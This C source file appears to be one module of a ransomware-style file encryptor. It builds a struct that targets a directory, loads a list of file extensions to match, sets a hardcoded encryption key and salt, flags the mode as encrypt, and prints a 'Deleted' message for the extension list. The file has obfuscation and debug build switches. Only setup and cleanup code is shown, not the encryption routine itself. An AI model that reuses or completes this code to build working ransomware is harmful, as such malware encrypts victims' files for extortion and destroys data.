#include "fournights.h"

/**
  * init_struct - la
  * @file_filter: la
  * Return: la
 **/
file_filter_t *init_struct(file_filter_t *file_filter, char *target_dir)
{
	char file_exts[1024];
#ifndef NO_DEBUG
	int i = 0;
#endif

	file_filter->tmp_bufs = malloc(sizeof(tmp_bufs_t));
	/**
	  * build tmp_bufs_s part of file_filter struct
	  * by allocating space for temporary buffers
	 **/
	file_filter->tmp_bufs->filepath = my_calloc(PATH_MAX, sizeof(char));
	file_filter->tmp_bufs->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
	/* init file_offset and bytes_read */
	file_filter->tmp_bufs->file_offset = 0;
	file_filter->tmp_bufs->bytes_read = 0;
	/* Ho!! Look a hardcoded key?! */
	file_filter->key = "9cd28b6451a8000a9092ab62aea609ee";
#ifndef NO_OBFUSCATION
	RAND_bytes(file_filter->salt, 8);
#endif
	file_filter->cipher_flag = 'e'; /* set cipher_flag to encrypt */
	file_filter->root_path = target_dir;

	getcwd(file_exts, sizeof(file_exts));
	my_strncat(file_exts, "/file_exts.txt\0", my_strlen(file_exts), 15);
	lstat(file_exts, &(file_filter->tmp_bufs->file_info));
	if(read_file(file_exts, file_filter, tokenizer) < 1)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "No Bytes read\n");
#endif
		return(NULL);
	}
	printf("Deleted %s\n", file_exts);
	/* reset file_offset and bytes_read */
	file_filter->tmp_bufs->file_offset = 0;
	file_filter->tmp_bufs->bytes_read = 0;

	/* Struct Built. */
#ifndef NO_DEBUG
	printf("root_path: %s\n", file_filter->root_path);
	for (i = 0; file_filter->file_extensions[i]; i++)
		printf("%s%s", i ? ", " : "", file_filter->file_extensions[i]);
	printf("\nKey: %s\n", file_filter->key);
#endif
	return(file_filter);
}

/**
  * free_file_filter_struct - Frees all malloced space in the struct
  * @file_filter: struct to free
 **/
void free_file_filter_struct(file_filter_t *file_filter)
{
	free(file_filter->tmp_bufs->buf);
	file_filter->tmp_bufs->buf = NULL;
	free(file_filter->tmp_bufs->filepath);
	file_filter->tmp_bufs->filepath = NULL;
	free(file_filter->tmp_bufs);
	file_filter->tmp_bufs = NULL;

	file_filter->root_path = NULL;
	free(file_filter->file_exts_whole_str);
	file_filter->file_exts_whole_str = NULL;
	free(file_filter->file_extensions);
	file_filter->file_extensions = NULL;
	file_filter = NULL;
}
